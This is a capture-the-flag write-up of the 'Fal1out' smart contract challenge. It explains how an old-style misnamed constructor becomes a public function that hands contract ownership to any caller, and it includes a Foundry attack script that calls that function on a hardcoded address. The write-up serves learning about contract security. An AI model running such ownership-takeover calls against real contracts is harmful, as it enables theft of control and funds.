# Fal1out   
Our mission is claiming ownership of the contract.   
What i noticed first, is the solidity version that is being used:
`pragma solidity ^0.6.0;` a very old version, right? 
Also this fragment of code:   
```solidity
/* constructor */
    function Fal1out() public payable {
        owner = msg.sender;
        allocations[owner] = msg.value;
    }
```
Why does the comment says "constructor" if that's a regular function? 🤔   
[Searching on Google](https://ethereum.stackexchange.com/a/45973) i found that on older solidity versions you had to declare the constructor using the same name of the contract instead of using the `constructor` keyword, so what was the constructor now is a regular function that we can execute so we become the owners of the contract.   
    
So, for solving this we just have to call the `Fal1out` function, i used this script for automating this process (it was easier to do using `cast` but i wanted to practice).   
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {Script} from "forge-std/Script.sol";

contract AttackScript is Script {
    address victim;

    constructor() {
        victim = 0x020a2877Faa90B8f04f383e17E84144dBD572014;
    }

    function run() external {
        vm.startBroadcast();
        (bool success, ) = victim.call{value: 0}(abi.encodeWithSignature("Fal1out()"));
        vm.stopBroadcast();
    }
}
```
This challenge is inspired by the [Rubixi hack](https://hydraxchain.medium.com/the-rubixi-hack-quick-explain-c7ae59afd957).   
